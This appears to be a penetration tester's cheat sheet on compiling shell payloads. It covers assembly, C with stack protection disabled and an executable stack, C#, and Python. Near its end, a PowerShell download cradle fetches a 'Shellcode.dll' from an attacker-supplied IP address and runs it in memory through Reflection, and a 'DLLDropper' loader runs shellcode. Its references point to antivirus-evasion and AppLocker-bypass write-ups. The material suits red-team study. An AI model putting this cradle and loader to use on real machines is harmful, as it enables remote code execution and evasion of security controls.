# Linux

## 01 - GAS (GNU assembler)

```
$ as --64 shell.s -o shell.o

$ ld -m elf_x86_64 shell.o -o shell
```

* **Specify architecture**

```
$ as --32 shell.s -o shell.o

$ ld -m elf_i386 shell.o -o shell
```

## 02 - YASM

```
$ yasm -f elf64 shell.asm -o shell.o

$ ld -m elf_x86_64 -o shell shell.o
```

With debugging

```
$ yasm -g dwarf2 -f elf64 shell.asm -l shell.lst -o shell.o

$ ld -g -m elf_x86_64 -o shell shell.o
```

## 03 - C

- **Compile to binary**

```
$ gcc -fno-stack-protector -zexecstack -static -o shell shell.c

$ gcc -zexecstack -static -o shell shell.c
```

- **Compile to shared object**

`$ gcc -shared -fno-stack-protector -zexecstack -static -o shell.so shell.c`

- **Specify architecture**

`$ gcc -m32 -fno-stack-protector -zexecstack -static -o shell shell.c`

## 04 - C++

- **Compile to binary**

`$ g++ -zexestack -static -o shell shell.cpp`

- **Specify architecture

`$ g++ -m32 -zexestack -static -o shell shell.cpp`

## 05 - C\#

- **Setup Dotnet SDK**

`$ sudo ./dotnet-install.sh -i /usr/share/dotnet -c 6.0`

- **Completely uninstall specific dotnet version**

```bash
SDK_VERSION="5.0.16"
DOTNET_VERSION="5.0.213"
DOTNET_UNINSTALL_PATH="/usr/share/dotnet"
rm -rf $DOTNET_UNINSTALL_PATH/sdk/$SDK_VERSION
rm -rf $DOTNET_UNINSTALL_PATH/shared/Microsoft.NETCore.App/$DOTNET_VERSION
rm -rf $DOTNET_UNINSTALL_PATH/shared/Microsoft.AspNetCore.All/$DOTNET_VERSION
rm -rf $DOTNET_UNINSTALL_PATH/shared/Microsoft.AspNetCore.App/$DOTNET_VERSION
rm -rf $DOTNET_UNINSTALL_PATH/host/fxr/$DOTNET_VERSION
```

- **Compile Windows executable**

```
$ dotnet publish -r <win-x64 | win10-x64> -c Release -p:PublishSingleFile=true -p:PublishTrimmed=true

$ dotnet publish -r win-x64 -c Release -p:PublishSingleFile=true -p:AllowUnsafeBlocks=true -p:PublishTrimmed=true
```

Or you can just use `build`

```
$ dotnet build -r win-x64 -c Release -p:PublishSingleFile=true -p:PublishTrimmed=true

$ dotnet build -r win-x64 -c Release -p:PublishSingleFile=true -p:AllowUnsafeBlocks=true -p:PublishTrimmed=true
```

- **Compile Windows Dynamic Linked Library**

Create ClassLibrary Project

`$ dotnet new classlib`

Compile C# DLL

`$ dotnet publish -r win-x64 -c Release --sc false -p:PublishTrimmed=true`

Allow unsafe code

`$ dotnet publish -r win-x64 -c Release -p:AllowUnsafeBlocks=true --sc false -p:PublishTrimmed=true`

Execute Shellcode

```
PS C:\> [System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("DLLDropper.dll")
PS C:\> [RunDLLPublicFunc.Class1]::runner()
```

`$ cat download-cradle-dll.ps1`

---

```powershell
$data = (New-Object Net.WebClient).DownloadData("http://<IP>/Shellcode.dll")  
$assembly = [System.Reflection.Assembly]::Load($data)  
$class = $assembly.GetType("Shellcode.Class1")  
$method = $class.GetMethod("<method_name>")  
$method.Invoke(0, $null)
```

## 06 - Python

`$ nuitka --onefile shell.py`

---
## References

- [Arch Linux Wiki .NET](https://wiki.archlinux.org/title/.NET)

- [Purpl3f0xsecur1ty.tech AV Evasion.html](https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html)

- [https://pentestlab.blog/2017/06/06/applocker-bypass-assembly-load/](https://pentestlab.blog/2017/06/06/applocker-bypass-assembly-load/)

- [Nuitka](https://nuitka.net/)